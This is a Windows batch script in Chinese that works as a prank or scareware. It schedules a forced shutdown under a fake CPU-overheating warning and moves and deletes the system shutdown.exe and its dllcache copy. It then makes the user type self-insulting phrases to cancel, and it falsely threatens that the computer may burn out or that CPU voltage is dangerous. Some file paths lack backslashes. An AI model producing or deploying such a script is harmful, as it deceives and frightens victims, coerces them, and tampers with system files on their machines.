@echo off
shutdown -s -t 40 -c "cpu高温预警 系统准备关机"
attrib C:WINDOWSsystem32shutdown.exe -r -a -s -h
del C:WINDOWSsystem32dllcacheshutdown.exe
move C:WINDOWSsystem32shutdown.exe c:
echo. 要解除关机倒计时和恢复cpu正常电压请回答以下问题谢谢!
echo.
echo. 
echo. 
echo. 请直接输入
echo. "我是蠢猪"加回车键
echo. "或者"
echo. "我是小狗"加回车键
echo.
SET /p tt=
echo.
if /I "%tt%"=="我是蠢猪" goto 00
:55
echo.对不起 您的电脑 可能在下次启动时烧毁 对您带来的不便 我们深表歉意 具体后果我也不清楚
goto 55
:00
echo. 你是春准吗？ "y"是 "n"不是
SET /p ff=
if /I "%ff%"=="y" (
copy c:shutdown.exe C:WINDOWSsystem32
shutdown -a
echo.
echo.
echo. "随便玩玩嘛 别生气哦 "
echo.
echo.
echo.
) else (
echo. 您设置的cpu工作电压过高 cpu存在危险！)
cmd.exe /k